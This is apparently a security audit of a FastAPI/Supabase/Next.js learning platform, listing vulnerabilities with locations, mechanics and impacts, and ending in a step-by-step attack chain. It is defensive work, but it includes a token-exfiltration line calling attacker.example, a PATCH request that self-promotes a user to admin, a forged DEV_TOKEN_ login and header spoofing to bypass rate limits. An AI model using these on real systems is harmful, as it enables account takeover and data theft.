# AdaptCode — Security Issues (detailed)

Every finding below includes: **where** it lives (file + line), **how** it works mechanically, **what an attacker gets**, and **why** the existing mitigations don't help. The companion file `SECURITY_FIXES.md` holds the fix for each one by the same number.

---

## CRITICAL

### C1. `TEST_MODE` is a universal account-takeover switch

**Where**
- `backend/app/core/dependencies.py` lines 13–27
- `backend/app/routers/auth.py` lines 17–32 (register), 72–83 (login)
- `backend/app/main.py` lines 38–41 (the "guard")

**How it works mechanically**
`get_current_user` is the one dependency every protected endpoint uses to turn an `Authorization: Bearer …` header into a `user_id`. Its first branch is:

```python
if settings.TEST_MODE and token.startswith("DEV_TOKEN_"):
    dev_email = token.replace("DEV_TOKEN_", "")
    user_record = supabase.table("users").select("user_id").eq("email", dev_email).execute()
    if user_record.data:
        return user_record.data[0]["user_id"]
    # ...otherwise it CREATES the user and returns the new id
```

There is no signature, no shared secret, no HMAC — just the literal prefix `DEV_TOKEN_` and the victim's email in plain text. If `TEST_MODE` is truthy on a live deployment, an attacker who knows (or can guess) any user's email signs in as them with one HTTP request. If the email doesn't exist, the branch *registers it as a new user* and signs in as that new identity.

**What an attacker gets**
- Full session as any registered user: read & write their mastery scores, submissions, history, payment state (`is_pro`), everything behind `require_admin` once combined with #C3.
- The ability to mint fresh users at will (DoS the users table, poison analytics).
- Admin access if the victim is an admin, since `require_admin` just checks `role` on the user they successfully authenticated as (see dependencies.py line 42).

**Why the existing mitigation doesn't help**
`main.py:41` has `assert not settings.TEST_MODE` guarded by `env == "production" or env == "prod"`:
- `assert` statements are stripped when Python is run with `-O` (common in some containers).
- The env check is a string compare. `ENV=Production`, `ENV=PROD` (uppercase without `.lower()` being applied to the comparison side — it is applied, but typos still slip: `prod ` with a trailing space, `prd`, unset default of `development`, any staging label).
- No runtime signal: the server will not log, alert, or refuse to boot if `TEST_MODE=true` sneaks in via `.env` file, CI secret, or copy-paste between environments.

**Severity: CRITICAL** — one env var = full compromise.

---

### C2. Server-side use of the Supabase service-role key disables RLS

**Where**
- `backend/app/core/config.py` line 8 (`SUPABASE_SERVICE_KEY`)
- `backend/apply_rls.sql` (all policies)
- Every router call that uses `get_supabase()` and then `.table(...)`

**How it works mechanically**
Supabase has two API keys: `anon` (respects Row-Level Security) and `service_role` (bypasses RLS entirely — it's the "backdoor" for trusted backends). The config exposes the service key to the Python backend; `get_supabase()` almost certainly builds a client with it (otherwise the server couldn't run queries that `apply_rls.sql` explicitly forbids for the anon user).

RLS policies in `apply_rls.sql` enforce ownership (`auth.uid() = user_id`), but **those policies are evaluated against the role of the connection**. A connection signed in with the service key is the Postgres superuser as far as RLS is concerned — every policy passes.

**What an attacker gets**
Any logic bug in a router (missing `user_id` filter, trusting a client-supplied `student_id`, SQL built from user input, path traversal into an unexpected table name) immediately escalates to "read or write any row in the database." You lose your second line of defense before the first one has even been attacked.

**Why the existing mitigation doesn't help**
`apply_rls.sql` is excellent defense-in-depth, but only for direct client → Supabase connections. The server is where most of the business logic runs, and the server has god-mode. The policies protect against the OAuth/Google-login path (which hits Supabase directly from the browser via the anon key) but not against the FastAPI path.

**Severity: CRITICAL** — RLS is theatre for 90% of your traffic.

---

### C3. Any user can self-promote to admin via RLS gap

**Where**
- `backend/apply_rls.sql` lines 14–15
- `backend/app/core/dependencies.py` lines 39–44 (`require_admin`)

**How it works mechanically**
The policy is:

```sql
CREATE POLICY "Users can only update their own profile" ON users
  FOR UPDATE USING (auth.uid() = user_id);
```

No `WITH CHECK` restricting which columns the user may touch. The `users` table has a `role` column (used by `require_admin` on dependencies.py:42). A logged-in user, using their own valid Supabase JWT and the anon key, can hit Supabase's PostgREST directly:

```
PATCH /rest/v1/users?user_id=eq.<their-own-id>
Authorization: Bearer <their-own-jwt>
apikey: <anon-key>
Content-Type: application/json

{"role": "admin"}
```

The RLS policy passes (they own the row). The write lands. On the next backend request they are now admin because `require_admin` just reads `role` from the row and trusts it.

**What an attacker gets**
- All of `/api/admin/*` (user listing with emails, platform stats).
- Any future admin-only endpoint added to the project automatically.
- No audit trail because this change happens in the DB, not via your API.

**Why the existing mitigation doesn't help**
`require_admin` is correctly written for its contract ("the user with this id has role = admin"). The vuln is upstream in the data layer. The CRUD surface in Supabase is open to the user because the policy doesn't restrict columns.

**Severity: CRITICAL** — any logged-in user → admin in one HTTP request.

---

### C4. Rate limiter trivially bypassable, enabling unlimited credential stuffing

**Where**
- `backend/app/core/rate_limit.py` lines 6–10
- `backend/app/routers/auth.py` lines 13 and 68 (`@limiter.limit("5/minute")`)

**How it works mechanically**
`get_real_ip` reads `X-Forwarded-For` and takes the first comma-separated value — with no allowlist of trusted proxies. In production you typically run behind one trusted proxy (Vercel/Cloudflare/Nginx) that *overwrites* or appends to this header. SlowAPI is told to key off that header as "the IP."

An attacker just sends their own `X-Forwarded-For` with a random value per request:

```
X-Forwarded-For: 1.2.3.4         → first request
X-Forwarded-For: 5.6.7.8         → second request
...
```

Each is treated as a different client by the limiter. The 5/min limit becomes irrelevant.

**What an attacker gets**
Unlimited login attempts per minute from a single IP. Combined with the login-vs-not-confirmed error leak (#H6) that enumerates valid emails, this is a free credential-stuffing playground. There's no per-account lockout either, so you can't catch it from the other side.

**Why the existing mitigation doesn't help**
`get_remote_address` is the fallback only when the header is missing. The header is attacker-controlled.

**Severity: CRITICAL** — your rate limit is a decoration.

---

### C5. Access token in `localStorage` with permissive CSP

**Where**
- `frontend/src/lib/auth-context.tsx` lines 44–73, 111–115 (`localStorage.setItem('access_token', ...)`)
- `frontend/next.config.mjs` line 30 (CSP)

**How it works mechanically**
Two problems that are each livable alone and lethal together:
1. The auth token is stored in `localStorage`. Any JavaScript running on your origin can read it (`localStorage.getItem('access_token')`).
2. The CSP header allows `script-src 'self' 'unsafe-eval' 'unsafe-inline' https://cdn.jsdelivr.net`. `unsafe-inline` means any injected `<script>…</script>` or `onerror="…"` executes. `unsafe-eval` means `eval()` and `new Function()` work. `cdn.jsdelivr.net` is a huge third-party surface.

So the only thing standing between any XSS (reflected, DOM-based, stored in a comment field, stored in a profile name) and complete account takeover is "did we write perfectly safe React code everywhere forever."

**What an attacker gets**
On any XSS: `fetch('https://attacker.example/x?t=' + localStorage.getItem('access_token'))`. From there, every API call they make is indistinguishable from the victim's. Tokens are long-lived Supabase JWTs, usually ~1 hour; refresh tokens may also be in localStorage.

**Why the existing mitigation doesn't help**
`X-XSS-Protection: 1; mode=block` is a legacy header modern browsers ignore. Framework (React) escapes by default, but `dangerouslySetInnerHTML`, `href="javascript:..."`, markdown renderers that allow raw HTML, or third-party widgets break the chain. Monaco Editor and `unsafe-eval` make CSP tightening non-trivial but not impossible.

**Severity: CRITICAL** — first XSS → total account takeover across all users who load the page.

---

## HIGH

### H6. Account enumeration via distinguishable login errors

**Where**
- `backend/app/routers/auth.py` lines 85–90 and lines 104–109

**How it works mechanically**
When login hits Supabase and `res.session` is falsy, the server replies with:
> `Invalid credentials or Email not confirmed. Please check your email or disable 'Confirm Email' in Supabase.`

When the whole call *raises* (unknown email, Supabase down, network error, etc.) the except branch replies with:
> `Invalid credentials.`

Those are two distinct bodies. An attacker scripting login attempts can send a known-bad password and read the response: one body means "this email exists," the other means "it doesn't." They now have an email oracle.

**What an attacker gets**
A validated list of real emails on the platform. That list is the input to credential stuffing (combined with #C4), phishing campaigns, and extortion.

**Why the existing mitigation doesn't help**
There is none. Both paths need to produce the exact same byte-for-byte response and the same timing (constant-time compare on the error path, same delays).

**Severity: HIGH** — reconnaissance step for every subsequent attack.

---

### H7. No local JWT verification: every request re-hits Supabase

**Where**
- `backend/app/core/dependencies.py` lines 29–37

**How it works mechanically**
Instead of verifying the JWT signature locally (fast, offline), the backend makes an `httpx` call to `https://<supabase>/auth/v1/user` on **every single authenticated request**. The `user_id` is read from the Supabase response body.

**What an attacker gets**
- Availability attack: slow or disrupt Supabase's `/auth/v1/user` → the entire AdaptCode API hangs or times out. The 10-second httpx timeout means one slow Supabase call blocks a Python worker for 10s.
- Rate-limit DoS: Supabase has its own rate limits on auth endpoints; a flood of your API traffic burns through them, blocking your own legitimate users.
- Cost: each API hit is one extra outbound HTTPS roundtrip + extra Supabase quota consumption.

**Why the existing mitigation doesn't help**
There is no caching, no JWKS verification, no signature check. The httpx timeout is a half-measure — 10s is far too high to call a hot-path dependency.

**Severity: HIGH** — availability + cost + a hard dependency you can't easily escape.

---

### H8. Error strings include user-controlled context in logs

**Where**
- `backend/app/routers/auth.py` lines 64, 108, 120, 135
- Similar `logger.error(f"...: {e}")` patterns likely in other routers

**How it works mechanically**
Lines like `logger.error(f"get_me failed for user {user_id}: {e}")` interpolate exception strings — which can contain SQL error messages, column names, URLs, upstream HTTP bodies, stack frames — into log lines that get shipped to log aggregators.

**What an attacker gets**
If logs are ever viewable by an attacker (log aggregator misconfiguration, error page that returns the exception, admin panel log viewer, sampled logs sent to a monitoring vendor whose org is later breached) they get a map of your DB schema and internal infrastructure.

**Why the existing mitigation doesn't help**
No log scrubbing, no structured logging with explicit field allowlist. The logger uses the uvicorn logger, which goes to stdout and from there wherever the deploy ships logs.

**Severity: HIGH** — amplifier for every other vuln.

---

### H9. CORS brittle, one typo away from permissive

**Where**
- `backend/app/main.py` lines 48–58

**How it works mechanically**
```python
origins = [settings.FRONTEND_URL]
if settings.TEST_MODE:
    origins.append("http://localhost:3000")

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

`allow_credentials=True` plus `allow_methods=["*"]` plus `allow_headers=["*"]` is already the most permissive legal CORS. If `FRONTEND_URL` is ever `"*"` (which is actually illegal with credentials and FastAPI will reject it) or set to an attacker-controlled subdomain via a misconfigured deployment, your API is readable from anywhere a browser can reach.

**What an attacker gets**
If the origin ever broadens to a domain the attacker controls, they can make authenticated cross-origin requests from a victim's browser. Combined with #C5 (token in localStorage), this is total compromise.

**Why the existing mitigation doesn't help**
There's no validator around `FRONTEND_URL`. It can be set to any string by env.

**Severity: HIGH** — brittleness that gets worse the more environments you add.

---

### H10. Dual auth paths (Supabase OAuth + custom login) share no guardrails

**Where**
- `frontend/src/app/login/page.tsx` lines 52–64 (Google OAuth via `supabase.auth.signInWithOAuth`)
- `frontend/src/lib/auth-context.tsx` lines 33–85 (both paths blended)

**How it works mechanically**
The Google OAuth flow goes browser → Supabase → browser. It never hits your FastAPI backend. Your rate limiter, your `TEST_MODE` guard, your audit logging, your IP geoblocking (if any) — none of it applies to this path. The session cookie is a Supabase cookie, upgraded in `handleSupabaseSession` to populate your auth context.

**What an attacker gets**
Two code paths to probe. Every invariant you add on the FastAPI side (lockout after N failed attempts, geo-based block, additional MFA) needs to be duplicated on the Supabase side via Supabase settings, or it will be bypassed by using the OAuth path.

**Why the existing mitigation doesn't help**
This isn't a bug per se — it's a design shape. The mitigation is "don't have two paths," or make them share middleware.

**Severity: HIGH** — doubles the auth surface and the invariant-sync work.

---

## MEDIUM

### M11. Piston executor has no per-user rate limit

**Where**
- `backend/app/core/executor.py` lines 13–67 (`execute_code`)
- No `@limiter.limit(...)` on the routes that call it (session.py or problems.py — not re-read here, but no decorator was observed around executor calls)

**How it works mechanically**
Submitting code hits Piston with `run_timeout: 5000` (ms) and `run_memory_limit: 128_000_000` (bytes). Those cap *one* run. There's nothing capping concurrent runs or runs per user per minute.

**What an attacker gets**
A single logged-in user can hammer the submission endpoint. Piston burns CPU, the FastAPI worker stays busy, legitimate users wait. Multiply by any trivial automation.

**Why the existing mitigation doesn't help**
Piston itself is a sandbox for untrusted code (good), but it is not a scheduler. The job of capping how often a given user may trigger a sandboxed run belongs to the API gateway, which here has no such cap.

**Severity: MEDIUM** — availability, not confidentiality.

---

### M12. CSP permits `unsafe-eval` + `unsafe-inline` + third-party CDN

**Where**
- `frontend/next.config.mjs` line 30

**How it works mechanically**
```
script-src 'self' 'unsafe-eval' 'unsafe-inline' https://cdn.jsdelivr.net
style-src 'self' 'unsafe-inline'
```

Monaco needs `unsafe-eval` to run its workers. `unsafe-inline` is almost never needed on top of that in a Next.js app that uses Tailwind + components. `cdn.jsdelivr.net` is a vast surface — one typosquatted or compromised package serves JS into your origin with the same privileges as your own code.

**What an attacker gets**
Lowers the bar for XSS exploitation (see #C5). Supply-chain exposure if any dependency starts loading something unexpected from jsdelivr.

**Why the existing mitigation doesn't help**
`unsafe-inline` and `unsafe-eval` are explicit opt-outs of CSP's main protection.

**Severity: MEDIUM** — amplifier for #C5.

---

### M13. Register has a race between `sign_up` and `users` insert

**Where**
- `backend/app/routers/auth.py` lines 34–50

**How it works mechanically**
Supabase creates the auth user, then the backend inserts a row into the public `users` table. If the second step fails (bad display name, DB hiccup, user disconnect, concurrent email conflict), you have an orphan auth row with no corresponding public row. Next login attempt by that email will succeed (Supabase has them) but downstream code that expects a public row will crash or create a second row in a different path.

**What an attacker gets**
A way to pollute the auth user space and cause support-ticket DoS. Not a direct auth bypass, but it's cheap to abuse.

**Why the existing mitigation doesn't help**
No transaction wraps the two writes.

**Severity: MEDIUM** — operational grief, not direct compromise.

---

### M14. No audit log of auth / admin / role mutations

**Where**
- Nowhere, which is the point.

**How it works mechanically**
After an incident you need to answer: who logged in when and from where, who called `/api/admin/*`, who changed `role` on which user, whose token was used from which IP. None of that is recorded in a durable, append-only way.

**What an attacker gets**
Impunity. Forensics after a breach become guesswork; you can't tell whether a user action was them or someone who stole their token.

**Why the existing mitigation doesn't help**
Server logs via `logger.error` are not an audit log — they're best-effort text ordered by whatever log vendor you use, often sampled, never signed.

**Severity: MEDIUM** — tooling you only miss when you need it most.

---

### M15. Leftover `fix_*.py` + seed/migration scripts in repo

**Where**
- `backend/apply_migrations.py`, `backend/seed_db.py`, `backend/pretrain.py`, loose SQL files
- (Many were removed in `d86bec9`; some remain)

**How it works mechanically**
Any script that imports `settings` or reads `SUPABASE_SERVICE_KEY` from env is a potential admin tool. Shipped to prod container, runnable by anyone with shell access via `docker exec`. One stale `--yes --wipe` script = disaster.

**What an attacker gets**
If they get code execution in your backend container (e.g., SSRF, deserialization bug, malicious dependency), these scripts are stepping stones to permanent damage.

**Why the existing mitigation doesn't help**
They don't need to be in the deployed image. The Dockerfile should produce a minimal image containing only the runtime application.

**Severity: MEDIUM** — supply chain and blast radius.

---

## LOW / INFO

### L16. Frontend `supabase.ts` crashes app at import if env var missing
`frontend/src/lib/supabase.ts:3-4` uses `!` on `process.env.NEXT_PUBLIC_SUPABASE_URL` and the anon key. Availability bug (what you hit live). Not security per se.

### L17. `jest.setup.ts` / orphan tests reference deleted modules
Build may still pass if jest isn't in the critical path, but CI can get noisy.

### L18. `docker-compose.yml` / `docker-compose.prod.yml` not audited
Confirm Postgres (5432), Redis (6379), Piston management (2000) are not published to 0.0.0.0 on the host.

### L19. HSTS set in middleware but not reinforced at edge
`main.py:28` sets `Strict-Transport-Security` on API responses. Make sure the frontend host (Vercel/custom) sets HSTS at the edge too — the API header does not protect the SPA.

### L20. Supabase anon key is public by design
`NEXT_PUBLIC_SUPABASE_ANON_KEY` is embedded in the client bundle. This is correct **only if** RLS is strict for the anon role (and today, see #C3, it is not strict enough).

---

## The chain of compromise

An attacker reading this top-down ends up with the following attack chain:

1. (#H6) Enumerate valid emails by probing login responses.
2. (#C4) Credential stuff them without rate limiting by rotating `X-Forwarded-For`.
3. If any one hits, (#C5) steal the token later via any XSS, or
4. (#C1) if `TEST_MODE` is ever on, skip steps 1–3 entirely and forge `DEV_TOKEN_<email>`.
5. (#C3) Promote the compromised account to admin with one `PATCH` to Supabase.
6. (#C2) Query any table via your API's service-key context, since RLS is bypassed server-side.
7. (#M14) Leave no audit trail; you cannot determine the blast radius after the fact.

That's the full picture. See `SECURITY_FIXES.md` for how to shut each step.
